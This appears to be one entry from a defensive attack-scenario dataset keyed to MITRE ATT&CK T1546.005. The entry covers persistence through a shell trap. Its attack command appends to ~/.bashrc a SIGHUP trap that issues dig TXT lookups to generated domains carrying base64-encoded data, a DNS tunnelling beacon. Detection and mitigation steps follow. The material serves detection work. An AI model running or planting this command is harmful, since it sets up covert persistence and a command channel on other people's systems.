---
type: campaign
scenario_id: 384
tactic: Persistence
technique: "T1546.005: Trap"
technique_id: T1546.005
tags: [campaign, lotl, persistence]
---

# Using trap for DNS tunneling persistence in Linux.

## Threat Description
Using trap for DNS tunneling persistence in Linux.

## Attack Command
```
echo 'trap "dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) > /dev/null" SIGHUP' >> ~/.bashrc
```

## Detection Logic
Monitor trap in bashrc: `cat ~/.bashrc | grep trap | grep dig`; Audit file changes: `auditctl -w ~/.bashrc -p wa`.

## Mitigation
Restrict bashrc writes: `chmod 600 ~/.bashrc`; Monitor shell configuration changes.

## AI Training Prompt
Train AI to detect DNS tunneling persistence via trap in bashrc by analyzing dig TXT commands, base64-encoded subdomains, and file modifications; suggest file protections.

## References
- MITRE ATT&CK T1546.005: https://attack.mitre.org/techniques/T1546/005/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
